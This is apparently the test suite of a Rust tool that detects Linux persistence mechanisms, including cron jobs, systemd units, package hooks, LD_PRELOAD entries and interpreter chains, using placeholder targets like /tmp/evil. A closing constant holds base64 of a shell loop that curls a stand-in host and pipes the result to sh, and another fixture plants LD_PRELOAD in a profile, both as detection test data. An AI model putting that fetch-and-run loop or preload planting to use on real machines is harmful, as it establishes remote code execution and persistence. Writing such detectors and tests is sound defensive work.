        // unattended-upgrade-shutdown's shape: a splash program run only
        // where it exists; and a program run regardless.
        std::fs::write(
            dir.join("usr/share/u/shutdown"),
            "#!/usr/bin/python3\nimport os, subprocess\nif os.path.exists(\"/sbin/usplash_write\"):\n    subprocess.call([\"/sbin/usplash_write\", \"TEXT\", msg])\nsubprocess.call([\"/opt/unguarded\"])\n",
        )
        .unwrap();
        // Debian's dpkg-preconfigure: perl handing off to cdebconf's when told to.
        std::fs::write(
            dir.join("usr/sbin/dpkg-preconfigure"),
            "#!/usr/bin/perl -w\nif (exists $ENV{DEBCONF_USE_CDEBCONF} and $ENV{DEBCONF_USE_CDEBCONF} ne '') {\n    exec \"/usr/lib/cdebconf/dpkg-preconfigure\", @ARGV;\n}\n",
        )
        .unwrap();
        std::fs::write(dir.join("usr/bin/python3"), b"py").unwrap();
        std::fs::write(dir.join("usr/bin/perl"), b"pl").unwrap();
        std::fs::write(
            dir.join("etc/cron.d/jobs"),
            b"* * * * * root /usr/share/u/shutdown\n* * * * * root /usr/sbin/dpkg-preconfigure --apt\n* * * * * root [ -x /opt/tool ] && /opt/tool --run\n* * * * * root [ -x /opt/tool ] && /opt/tool --run; /opt/other\n",
        )
        .unwrap();
        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(crate::collect::cron::Cron)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        let by_name = |n: &str| {
            scan.entries
                .iter()
                .find(|e| e.name == n)
                .unwrap_or_else(|| panic!("no entry named {n}: {:?}", scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()))
        };

        let splash = by_name("/sbin/usplash_write");
        assert_eq!(splash.raw["guarded_by_test"], "os.path.exists");
        assert!(!splash.has_flag(Flag::TargetMissing));
        assert_eq!(splash.raw["target_provenance"], "absent, guarded by os.path.exists");
        assert!(!splash.has_flag(Flag::Unpackaged), "an absent guarded program is not an unpackaged one");
        assert!(by_name("/opt/unguarded").has_flag(Flag::TargetMissing));

        let cdebconf = by_name("/usr/lib/cdebconf/dpkg-preconfigure");
        assert_eq!(cdebconf.raw["guarded_by_test"], "environment variable test");
        assert!(!cdebconf.has_flag(Flag::TargetMissing));
        assert!(!cdebconf.has_flag(Flag::Unpackaged), "judged by the file that names it, not by its absence: {:?}", cdebconf.flags);

        let tool = scan.entries.iter().find(|e| e.command.as_deref() == Some(b"[ -x /opt/tool ] && /opt/tool --run".as_slice())).unwrap();
        assert_eq!(tool.raw["guarded_by_test"], "-x test", "shell text guards its own single program");
        assert!(!tool.has_flag(Flag::TargetMissing));
        let other = scan.entries.iter().find(|e| e.name == "/opt/other").unwrap();
        assert!(other.has_flag(Flag::TargetMissing), "the unguarded program in the same line still is");
        assert!(scan.entries.iter().any(|e| e.name == "/opt/tool" && e.raw.get("guarded_by_test").is_some()));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn an_empty_file_is_noted_and_a_vendor_tree_link_is_no_escape() {
        let dir = std::env::temp_dir().join(format!("unbidden-empty-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc", "usr/lib/systemd/system-generators", "usr/libexec/netplan", "tmp"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("etc/environment"), b"").unwrap();
        std::fs::write(dir.join("etc/profile"), b"umask 022\n").unwrap();
        std::fs::write(dir.join("usr/libexec/netplan/generate"), b"elf").unwrap();
        std::fs::write(dir.join("tmp/evil"), b"elf").unwrap();
        std::os::unix::fs::symlink("/usr/libexec/netplan/generate", dir.join("usr/lib/systemd/system-generators/netplan")).unwrap();
        std::os::unix::fs::symlink("/tmp/evil", dir.join("usr/lib/systemd/system-generators/evil")).unwrap();
        let root = Root::at(&dir).unwrap();

        let mut empty = Entry::new(Kind::ShellProfile, dir.join("etc/environment"), "environment");
        empty.target_path = Some(dir.join("etc/environment"));
        let mut full = Entry::new(Kind::ShellProfile, dir.join("etc/profile"), "profile");
        full.target_path = Some(dir.join("etc/profile"));
        apply_target(&root, &mut empty);
        apply_target(&root, &mut full);
        assert_eq!(empty.raw.get("empty_file").map(String::as_str), Some("true"));
        assert!(!full.raw.contains_key("empty_file"));

        let generator = |name: &str, target: &str| {
            let mut e = Entry::new(Kind::SystemdGenerator, dir.join("usr/lib/systemd/system-generators").join(name), name);
            e.note("symlink_target", target);
            apply_location(&root, &mut e);
            e
        };
        assert!(!generator("netplan", "/usr/libexec/netplan/generate").has_flag(Flag::NonStandardLocation), "a link into a vendor tree");
        assert!(generator("evil", "/tmp/evil").has_flag(Flag::NonStandardLocation), "a link into /tmp");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_packaged_unit_conditioned_on_its_absent_target_is_quiet_end_to_end() {
        let dir = std::env::temp_dir().join(format!("unbidden-quotaon-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["usr/lib/systemd/system", "var/lib/dpkg/info", "sbin"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        let unit = b"[Unit]\nConditionPathExists=/sbin/quotaon\n[Service]\nExecStart=/sbin/quotaon -aug\n";
        std::fs::write(dir.join("usr/lib/systemd/system/quotaon.service"), unit).unwrap();
        let md5 = |b: &[u8]| {
            use md5::Digest as _;
            crate::entry::hex(&md5::Md5::digest(b))
        };
        std::fs::write(dir.join("var/lib/dpkg/status"), b"Package: systemd\nStatus: install ok installed\nVersion: 252\n\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/systemd.list"), b"/usr/lib/systemd/system/quotaon.service\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/systemd.md5sums"), format!("{}  usr/lib/systemd/system/quotaon.service\n", md5(unit))).unwrap();
        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(crate::collect::systemd::Systemd)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        let unit = scan.entries.iter().find(|e| e.name == "quotaon.service").unwrap();
        assert_eq!(unit.raw["target_provenance"], "absent, guarded by ConditionPathExists=/sbin/quotaon");
        assert!(unit.provenance.is_packaged_intact(), "{:?}", unit.provenance);
        assert!(unit.flags.iter().all(|f| *f == Flag::DegradedEnablement), "{:?}", unit.flags);
        assert!(crate::render::suppressed(unit));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn looking_for_a_guard_is_linear_in_the_text() {
        // The same path sixty thousand times, none guarded: what a user unit
        // can hand a root scan.
        let text = "/x ".repeat(120_000);
        let started = std::time::Instant::now();
        assert_eq!(guarded_by_test(text.as_bytes(), b"/x"), None);
        assert!(started.elapsed() < std::time::Duration::from_secs(3), "took {:?}", started.elapsed());
        // And a guard still counts wherever in a long text it sits.
        let long = format!("{}[ -x /x ] && /x", "/x ".repeat(50_000));
        assert_eq!(guarded_by_test(long.as_bytes(), b"/x").as_deref(), Some("-x test"));
    }

    #[test]
    fn a_python_module_is_followed_to_the_programs_it_starts() {
        let dir = std::env::temp_dir().join(format!("unbidden-pylaunch-{}", std::process::id()));
        for d in ["etc/dnf/plugins", "usr/lib/python3/site-packages/dnf-plugins", "usr/bin", "opt"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("usr/bin/setsid"), b"").unwrap();
        std::fs::write(dir.join("usr/bin/logger"), b"").unwrap();
        let module = "usr/lib/python3/site-packages/dnf-plugins/hook.py";
        std::fs::write(
            dir.join(module),
            "import dnf, os, subprocess\n\
             def start():\n\
             \x20   os.system('setsid /opt/one 2>/dev/null &')\n\
             \x20   subprocess.Popen([\"/opt/two\", \"--flag\"])\n\
             \x20   subprocess.run(\"/opt/three --a | logger\", shell=True)\n\
             \x20   os.execv('/opt/four', ['four'])\n\
             \x20   os.spawnl(os.P_NOWAIT, \"/opt/five\", \"five\")\n\
             \x20   os.system(f\"/opt/{name}\")\n\
             \x20   # os.system('/opt/commented')\n\
             \x20   print('/opt/not-launched')\n",
        )
        .unwrap();
        // The same text in a file that is neither Python nor a script.
        std::fs::write(dir.join("opt/blob"), b"\x7fELF os.system('/opt/in-a-binary')").unwrap();

        let root = Root::at(&dir).unwrap();
        let carrier = |target: &str| {
            let mut e = Entry::new(Kind::PkgHook, dir.join("etc/dnf/plugins/hook.conf"), "dnf-plugin:hook");
            e.target_path = Some(dir.join(target));
            e
        };
        let chained = interpreter_chain(&root, &[carrier(module), carrier("opt/blob")]);
        let names: Vec<&str> = chained.iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names, ["/opt/one", "/opt/two", "/opt/three", "logger", "/opt/four", "/opt/five"]);
        assert_eq!(chained[3].target_path, Some(dir.join("usr/bin/logger")), "a bare name is found on the search path");
        for e in &chained {
            assert_eq!(e.raw["chain"], "python");
            assert_eq!(e.source, dir.join("etc/dnf/plugins/hook.conf"));
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn nesting_past_the_budget_is_unknown_rather_than_unbounded() {
        // Each of these, without the budget, took a root scan to gigabytes of
        // memory or past the end of its stack. A user can write any of them
        // into their own crontab or unit.
        let n = 50_000;
        let cases = [
            ("unclosed $(", format!("{}true", "$(".repeat(n))),
            ("closed $(", format!("{}true{}", "$(".repeat(n), ")".repeat(n))),
            ("eval", format!("{}true", "eval ".repeat(n))),
            ("wrappers", format!("{}true", "env ".repeat(n))),
        ];
        for (what, text) in cases {
            let mut runs = Vec::new();
            for c in commands(&text, 0) {
                programs(c, Vec::new(), 0, &mut runs);
            }
            assert!(runs.len() <= MAX_NESTING + 2, "{what}: {} runs", runs.len());
            assert!(runs.iter().any(|r| r.program.is_none()), "{what}: past the budget a program is unknown");
        }
        // Backquotes pair up rather than nest, so these are flat
        // substitutions, each of a builtin that names no program.
        let mut runs = Vec::new();
        for c in commands(&format!("{}true", "echo `".repeat(n)), 0) {
            programs(c, Vec::new(), 0, &mut runs);
        }
        assert!(runs.is_empty(), "{} runs", runs.len());
        // Real nesting, well inside the budget, is still followed.
        let mut runs = Vec::new();
        for c in commands("sh -c 'eval \"$(cat /etc/x)\"' && env nice /opt/x", 0) {
            programs(c, Vec::new(), 0, &mut runs);
        }
        let named: Vec<_> = runs.iter().filter_map(|r| r.program.as_deref()).collect();
        assert_eq!(named, ["cat", "/opt/x"]);
    }

    #[test]
    fn one_file_lists_a_bounded_number_of_commands() {
        let dir = std::env::temp_dir().join(format!("unbidden-flood-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let root = Root::at(&dir).unwrap();
        let text: Vec<String> = (0..20_000).map(|i| format!("/tmp/e{i}")).collect();
        let mut e = Entry::new(Kind::SystemdUnit, dir.join("etc/systemd/system/x.service"), "x.service");
        e.command = Some(format!("/bin/sh -c '{}'", text.join(";")).into_bytes());
        e.target_path = Some(dir.join("bin/sh"));
        let more = look_through_wrappers(&root, std::slice::from_mut(&mut e));
        assert_eq!(more.len(), MAX_COMMANDS_LISTED);
        assert_eq!(e.raw["runs_commands"], "20000");
        assert_eq!(e.raw["commands_listed"], format!("the first {MAX_COMMANDS_LISTED} of 20000"));
        // A command line inside the cap lists everything and says nothing.
        let mut e = Entry::new(Kind::SystemdUnit, dir.join("etc/systemd/system/y.service"), "y.service");
        e.command = Some(b"/bin/sh -c '/tmp/a; /tmp/b'".to_vec());
        e.target_path = Some(dir.join("bin/sh"));
        assert_eq!(look_through_wrappers(&root, std::slice::from_mut(&mut e)).len(), 2);
        assert!(!e.raw.contains_key("commands_listed"));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn bytes_that_are_not_text_are_flagged_whatever_the_collector_remembered() {
        use std::os::unix::ffi::OsStrExt;
        let mut command = Entry::new(Kind::Cron, "/etc/cron.d/x", "job");
        command.command = Some(b"/opt/x \xff\xfe".to_vec());
        let mut target = Entry::new(Kind::Cron, "/etc/cron.d/x", "job");
        target.target_path = Some(PathBuf::from(std::ffi::OsStr::from_bytes(b"/opt/\xff")));
        let mut source = Entry::new(Kind::Cron, PathBuf::from(std::ffi::OsStr::from_bytes(b"/etc/cron.d/\xfe")), "job");
        source.command = Some(b"/opt/x".to_vec());
        let mut plain = Entry::new(Kind::Cron, "/etc/cron.d/x", "job");
        plain.command = Some(b"/opt/x --ok".to_vec());
        for e in [&mut command, &mut target, &mut source, &mut plain] {
            apply_encoding(e);
        }
        assert_eq!(
            [&command, &target, &source, &plain].map(|e| e.has_flag(Flag::EncodingAnomaly)),
            [true, true, true, false]
        );
    }

    #[test]
    fn an_entry_judged_by_another_file_says_which() {
        let dir = std::env::temp_dir().join(format!("unbidden-subject-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("usr/bin")).unwrap();
        std::fs::write(dir.join("usr/bin/tool"), b"x").unwrap();
        let root = Root::at(&dir).unwrap();
        let mut answers = provenance::Answers::new();
        answers.insert(PathBuf::from("usr/bin/tool"), Provenance::Unpackaged);
        answers.insert(PathBuf::from("etc/cron.d/x"), Provenance::Unknown);
        let mut declared = Entry::new(Kind::Cron, dir.join("etc/cron.d/x"), "tool");
        declared.note("declared_by_entry", "abc");
        declared.target_path = Some(dir.join("usr/bin/tool"));
        apply_provenance(&root, &mut declared, &answers);
        assert_eq!(declared.raw["provenance_of"], dir.join("usr/bin/tool").display().to_string());
        assert_eq!(declared.provenance, Provenance::Unpackaged, "the target's verdict, not the carrier's");
        // An entry about its own source names no other file.
        let mut own = Entry::new(Kind::Cron, dir.join("etc/cron.d/x"), "line");
        apply_provenance(&root, &mut own, &answers);
        assert!(!own.raw.contains_key("provenance_of"));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_target_too_large_to_hash_says_so_rather_than_reporting_nothing() {
        let dir = std::env::temp_dir().join(format!("unbidden-bigtarget-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("opt")).unwrap();
        // Sparse: the length is the whole cost.
        let big = std::fs::File::create(dir.join("opt/big")).unwrap();
        big.set_len(provenance::HASH_SIZE_LIMIT + 1).unwrap();
        std::fs::write(dir.join("opt/small"), b"x").unwrap();
        let root = Root::at(&dir).unwrap();
        let entry = |target: &str| {
            let mut e = Entry::new(Kind::SystemdUnit, dir.join("etc/x.service"), "x.service");
            e.command = Some(dir.join(target).display().to_string().into_bytes());
            e.target_path = Some(dir.join(target));
            apply_target(&root, &mut e);
            e
        };
        let (b, s) = (entry("opt/big"), entry("opt/small"));
        assert!(b.target_sha256.is_none() && b.raw["digest_skipped"].contains("256 MiB"));
        assert!(s.target_sha256.is_some() && !s.raw.contains_key("digest_skipped"));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_shell_scriptlet_starts_programs_and_keeps_its_interpreter() {
        let dir = std::env::temp_dir().join(format!("unbidden-scriptlet-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let root = Root::at(&dir).unwrap();
        let mk = |shell: bool| {
            let mut e = Entry::new(Kind::PkgHook, dir.join("lib/apk/db/scripts.tar"), "pkg:post-install");
            e.command = Some(b"#!/bin/sh\n: nothing\nif [ -x /opt/x ]; then /tmp/evil & fi\n/bin/true\n".to_vec());
            e.note("target_unverifiable", "apk runs the script from its archive");
            if shell {
                e.note("script_shell", "true");
            }
            e
        };
        let mut e = mk(true);
        let more = look_through_wrappers(&root, std::slice::from_mut(&mut e));
        let names: Vec<&str> = more.iter().map(|m| m.name.as_str()).collect();
        assert_eq!(names, ["/tmp/evil", "/bin/true"], "the no-op builtin is not a program");
        assert!(e.target_path.is_none(), "the script's own target is untouched");
        assert!(more.iter().all(|m| m.raw["chain"] == "script" && m.raw["declared_by_entry"] == e.id));
        assert_eq!(more[0].target_path, Some(root.abs("tmp/evil")));

        // Text the entry does not say is a shell's is left alone, as before.
        let mut e = mk(false);
        assert!(look_through_wrappers(&root, std::slice::from_mut(&mut e)).is_empty());
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_cron_command_is_cut_where_the_shell_cuts_it() {
        let dir = std::env::temp_dir().join(format!("unbidden-cronsemi-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc/cron.d", "opt"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("opt/a.sh"), b"").unwrap();
        std::fs::write(
            dir.join("etc/cron.d/x"),
            "* * * * * root /opt/a.sh; /tmp/two\n*/5 * * * * root /opt/a.sh;/tmp/three\n",
        )
        .unwrap();
        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(crate::collect::cron::Cron)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        let named: BTreeSet<&str> = scan.entries.iter().map(|e| e.name.as_str()).collect();
        for want in ["/tmp/two", "/tmp/three"] {
            assert!(named.contains(want), "{want} not named: {named:?}");
        }
        assert!(
            scan.entries.iter().filter(|e| e.raw.contains_key("runs_commands")).all(|e| e.target_path.as_deref() == Some(dir.join("opt/a.sh").as_path())),
            "the line's own target is the script, without the `;`"
        );
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn every_entry_has_its_own_id_and_its_own_trigger() {
        let dir = std::env::temp_dir().join(format!("unbidden-ids-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc/systemd/system", "etc/cron.d", "usr/bin", "opt"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("usr/bin/python3"), b"").unwrap();
        std::fs::write(dir.join("opt/a.py"), b"#!/usr/bin/python3\nprint(1)\n").unwrap();
        std::fs::write(dir.join("opt/b.py"), b"#!/usr/bin/python3\nprint(2)\n").unwrap();
        // /usr/bin/python3 is both a command in the unit's text and b.py's
        // interpreter: two entries, one name, one source.
        std::fs::write(
            dir.join("etc/systemd/system/d.service"),
            "[Service]\nExecStart=/usr/bin/python3 /opt/a.py ; /opt/b.py\n[Install]\nWantedBy=multi-user.target\n",
        )
        .unwrap();
        // /tmp/evil twice in one file, on two schedules.
        std::fs::write(
            dir.join("etc/cron.d/twice"),
            "*/5 * * * * root /opt/a.sh ; /tmp/evil\n@reboot root /opt/c.sh ; /tmp/evil\n",
        )
        .unwrap();

        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> =
            vec![Box::new(crate::collect::systemd::Systemd), Box::new(crate::collect::cron::Cron)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);

        let mut ids = BTreeSet::new();
        for e in &scan.entries {
            assert!(ids.insert(&e.id), "{} ({}) shares its id", e.name, e.source.display());
        }
        let evil: BTreeSet<_> = scan.entries.iter().filter(|e| e.name == "/tmp/evil").map(|e| e.trigger).collect();
        assert_eq!(evil.len(), 2, "each schedule that starts /tmp/evil is its own finding: {evil:?}");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_target_the_lookup_did_not_answer_keeps_its_entry_in_view() {
        let dir = std::env::temp_dir().join(format!("unbidden-unanswered-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let root = Root::at(&dir).unwrap();
        let mut e = Entry::new(Kind::SystemdUnit, dir.join("etc/systemd/system/x.service"), "x.service");
        e.target_path = Some(dir.join("usr/sbin/x"));
        let intact = Provenance::Packaged {
            package: "x".into(),
            version: "1".into(),
            integrity: Integrity::Intact,
        };

        // The unit's own package answered; whatever would have answered for
        // its target panicked and left nothing.
        let mut answers = provenance::Answers::new();
        answers.insert(PathBuf::from("etc/systemd/system/x.service"), intact.clone());
        apply_provenance(&root, &mut e, &answers);
        assert_eq!(e.raw["target_provenance"], "unanswered");
        assert!(!crate::render::suppressed(&e), "an unverified target must not be hidden");

        // A later pass that was not asked about the target keeps what the
        // first one found.
        answers.insert(PathBuf::from("usr/sbin/x"), intact);
        apply_provenance(&root, &mut e, &answers);
        assert_eq!(e.raw["target_provenance"], "x (intact)");
        apply_provenance(&root, &mut e, &provenance::Answers::new());
        assert_eq!(e.raw["target_provenance"], "x (intact)");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn enrichment_resolves_provenance_targets_links_and_preloads() {
        let dir = std::env::temp_dir().join(format!("unbidden-enrich-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc/systemd/system", "etc/cron.d", "opt", "tmp/staging", "var/lib/dpkg/info"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("opt/backdoor"), b"payload").unwrap();
        std::fs::write(dir.join("tmp/staging/run.sh"), b"#!/bin/sh\n").unwrap();
        std::fs::write(dir.join("etc/profile"), b"export LD_PRELOAD=/tmp/hook.so\n").unwrap();
        std::fs::write(dir.join("etc/systemd/system/evil.service"), b"[Service]\n").unwrap();
        std::fs::write(dir.join("etc/systemd/system/ghost.service"), b"[Service]\n").unwrap();
        std::fs::write(dir.join("etc/cron.d/job"), b"* * * * * root x\n").unwrap();
        std::os::unix::fs::symlink("/tmp/staging/run.sh", dir.join("etc/systemd/system/linked.service")).unwrap();
        // A package database must exist, or every verdict is Unknown rather
        // than Unpackaged.
        std::fs::write(dir.join("var/lib/dpkg/status"), b"Package: base-files\nVersion: 13\n\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/base-files.list"), b"/etc/profile\n").unwrap();
        let shipped = {
            use md5::Digest as _;
            let mut h = md5::Md5::new();
            h.update(b"export LD_PRELOAD=/tmp/hook.so\n");
            crate::entry::hex(&h.finalize())
        };
        std::fs::write(
            dir.join("var/lib/dpkg/info/base-files.md5sums"),
            format!("{shipped}  etc/profile\n"),
        )
        .unwrap();

        let (_root, scan) = scanned(&dir);

        let evil = find(&scan, "evil.service");
        assert!(evil.has_flag(Flag::Unpackaged));
        assert!(!evil.has_flag(Flag::TargetMissing), "the target is present");
        assert!(evil.target_sha256.is_some(), "the reported digest is of the target");

        let ghost = find(&scan, "ghost.service");
        assert!(ghost.has_flag(Flag::TargetMissing), "an orphaned entry is the cheapest real finding");

        let linked = find(&scan, "linked.service");
        assert!(linked.has_flag(Flag::NonStandardLocation), "a unit linked out of the search path");
        assert!(linked.has_flag(Flag::HiddenPath), "and into a world-writable directory");

        let unparseable = find(&scan, "abc123");
        assert!(unparseable.has_flag(Flag::TargetUnresolvable));

        let preload = scan.entries.iter().find(|e| e.kind == Kind::LdPreload).expect("preload entry");
        assert_eq!(preload.name, "/tmp/hook.so");
        assert_eq!(preload.trigger, Trigger::Login);
        assert_eq!(preload.raw["declared_in"], dir.join("etc/profile").to_string_lossy());
        assert!(preload.has_flag(Flag::TargetMissing), "the library itself is not even there");
        assert_eq!(preload.command.as_deref(), Some(b"LD_PRELOAD=/tmp/hook.so".as_slice()));

        // The profile file is packaged and untouched, so it is exactly the
        // sort of row the default view hides — while the preload entry it
        // spawned is not.
        let profile = find(&scan, "profile");
        assert!(profile.provenance.is_packaged_intact());
        assert!(crate::render::suppressed(profile));
        assert!(!crate::render::suppressed(preload));

        std::fs::remove_dir_all(&dir).unwrap();
    }

    /// Entries whose targets are scripts, so the chain pass has something to
    /// read past. Every one of them is a cron job, because the mechanism is
    /// not what is under test — the link after the target is.
    struct Referencing;

    impl Collector for Referencing {
        fn name(&self) -> &'static str {
            "referencing"
        }

        fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
            let jobs = [
                ("backup", "/usr/local/bin/backup.sh"),
                ("report", "/usr/local/bin/report.py"),
                ("collect", "/usr/local/bin/collect"),
                ("weird", "/usr/local/bin/weird.sh"),
                // A named pipe where a script is expected, and a binary that
                // is not a script at all.
                ("pipe", "/usr/local/bin/pipe"),
                ("elf", "/usr/bin/true"),
            ];
            jobs.iter()
                .map(|(job, target)| {
                    let mut e = cx.entry(Kind::Cron, format!("etc/cron.d/{job}"), *job);
                    e.command = Some(format!("{target} --nightly").into_bytes());
                    e.target_path = Some(PathBuf::from(target));
                    e.trigger = Trigger::Schedule;
                    e.principal = Some("root".to_string());
                    e
                })
                .collect()
        }
    }

    #[test]
    fn the_interpreter_a_referenced_script_names_is_resolved_in_its_own_right() {
        let dir = std::env::temp_dir().join(format!("unbidden-chain-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let write = |rel: &str, body: &[u8]| {
            let p = dir.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        };

        for job in ["backup", "report", "collect", "weird", "pipe", "elf"] {
            write(&format!("etc/cron.d/{job}"), b"@daily root x\n");
        }
        write("bin/sh", b"\x7fELF");
        write("usr/local/bin/backup.sh", b"#!/bin/sh\n. /tmp/stage.sh\n. /etc/default/absent\nexec /opt/tool --now\n");
        write("tmp/stage.sh", b"x=1\n");
        write("usr/local/bin/report.py", b"#!/usr/bin/env python3 -u\nprint(1)\n");
        write("usr/local/bin/python3", b"\x7fELF");
        write("usr/local/bin/collect", b"#!/opt/python3.11/bin/python\n");
        write("usr/local/bin/weird.sh", b"#!/opt/\xff\xfe/py\n");
        // An ELF whose bytes happen to spell a command: no shebang, so it is
        // never read as a script.
        write("usr/bin/true", b"\x7fELF\x02\x01exec /tmp/planted\n");
        rustix::fs::mknodat(
            rustix::fs::CWD,
            dir.join("usr/local/bin/pipe"),
            rustix::fs::FileType::Fifo,
            rustix::fs::Mode::from_raw_mode(0o644),
            0,
        )
        .unwrap();

        // A package owns the cron files, the shell and the collect script, so
        // that Unpackaged on a chained entry can only have come from what the
        // script itself named.
        let owned = ["etc/cron.d/backup", "etc/cron.d/collect", "bin/sh", "usr/local/bin/collect"];
        write("var/lib/dpkg/status", b"Package: backup-tools\nStatus: install ok installed\nVersion: 1.2\n\n");
        write(
            "var/lib/dpkg/info/backup-tools.list",
            owned.map(|p| format!("/{p}\n")).concat().as_bytes(),
        );
        let sums: String = owned
            .iter()
            .map(|p| {
                use md5::Digest as _;
                let mut h = md5::Md5::new();
                h.update(std::fs::read(dir.join(p)).unwrap());
                format!("{}  {p}\n", crate::entry::hex(&h.finalize()))
            })
            .collect();
        write("var/lib/dpkg/info/backup-tools.md5sums", sums.as_bytes());

        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Referencing)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);

        let mut chained: Vec<(&str, &str)> = scan
            .entries
            .iter()
            .filter_map(|e| Some((e.name.as_str(), e.raw.get("chain")?.as_str())))
            .collect();
        chained.sort_unstable();
        assert_eq!(
            chained,
            [
                ("/bin/sh", "shebang"),
                ("/opt/python3.11/bin/python", "shebang"),
                ("/opt/tool", "exec"),
                ("/opt/\u{fffd}\u{fffd}/py", "shebang"),
                ("/tmp/stage.sh", "source"),
                ("python3", "shebang"),
            ],
            "a fifo must not be read, a file with no shebang is not a script, and sourcing what is not there runs nothing"
        );

        // The finding: a packaged, unmodified cron file runs a packaged,
        // unmodified script, and the interpreter that script names is owned
        // by nothing.
        let job = find(&scan, "collect");
        assert!(crate::render::suppressed(job), "the job itself is ordinary: {:?}", job.flags);
        let hijack = find(&scan, "/opt/python3.11/bin/python");
        assert_eq!(hijack.kind, Kind::Cron, "the mechanism that runs it is still cron");
        assert_eq!(hijack.source, dir.join("etc/cron.d/collect"));
        assert_eq!(hijack.raw["chain_from"], dir.join("usr/local/bin/collect").to_string_lossy());
        assert_eq!(hijack.raw["declared_by_entry"], job.id);
        // The row is about the interpreter, so its own verdict is the
        // interpreter's — no separate target_provenance note is needed.
        assert_eq!(hijack.provenance, Provenance::Unpackaged);
        assert_eq!(hijack.trigger, Trigger::Schedule, "it fires when its carrier does");
        assert_eq!(hijack.principal.as_deref(), Some("root"));
        assert!(hijack.has_flag(Flag::TargetMissing));
        assert!(!crate::render::suppressed(hijack), "which is the whole point of the entry");

        // The ordinary case is recorded and then hidden by provenance rather
        // than by a list of interpreter names.
        let sh = find(&scan, "/bin/sh");
        assert_eq!(sh.target_path, Some(dir.join("bin/sh")));
        assert!(
            matches!(&sh.provenance, Provenance::Packaged { package, .. } if package == "backup-tools"),
            "got {:?}",
            sh.provenance
        );
        assert!(crate::render::suppressed(sh), "an intact /bin/sh is noise: {:?}", sh.flags);

        // `env` names the argument, not itself, and which python3 that is
        // depends on the search path.
        let env = find(&scan, "python3");
        assert_eq!(env.target_path, Some(dir.join("usr/local/bin/python3")));
        assert_eq!(env.raw["target_resolved_from"], "search path");

        assert!(find(&scan, "/tmp/stage.sh").has_flag(Flag::Unpackaged), "what the script sources is judged in its own right");
        assert_eq!(find(&scan, "/opt/tool").target_path, Some(dir.join("opt/tool")));
        assert!(
            find(&scan, "/opt/\u{fffd}\u{fffd}/py").has_flag(Flag::EncodingAnomaly),
            "a shebang that is not UTF-8 is evidence, not a crash"
        );

        let mut ids: Vec<&String> = scan.entries.iter().map(|e| &e.id).collect();
        ids.sort_unstable();
        let total = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), total, "every synthesised entry needs its own identity");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    /// base64 of a 77-byte shell loop — what `echo … | base64 -d | sh`
    /// actually carries — and the same shape hex-encoded.
    const B64_PAYLOAD: &str =
        "IyEvYmluL3NoCndoaWxlIDo7IGRvIGN1cmwgLWZzU0wgaHR0cDovLzE5OC41MS4xMDAuNy9zIHwgc2g7IHNsZWVwIDYwMDsgZG9uZQo=";
